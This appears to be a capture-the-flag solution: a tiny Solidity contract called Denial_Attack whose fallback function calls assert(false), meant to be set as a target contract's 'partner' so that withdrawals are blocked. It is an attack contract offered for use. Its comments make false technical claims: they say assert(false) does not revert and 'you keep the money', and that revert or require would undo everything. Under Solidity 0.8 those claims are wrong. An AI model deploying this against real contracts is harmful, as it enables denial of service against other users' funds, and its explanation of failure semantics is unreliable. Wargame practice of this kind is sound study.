//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;



contract Denial_Attack{
    
    fallback () external payable {
        assert(false); //this does not revert so you keep the money
        //revert(); and require(condition,"") will revert all transactions including money you get from contract as partner
    }
}

//Deploy this cotract and set its address as partner.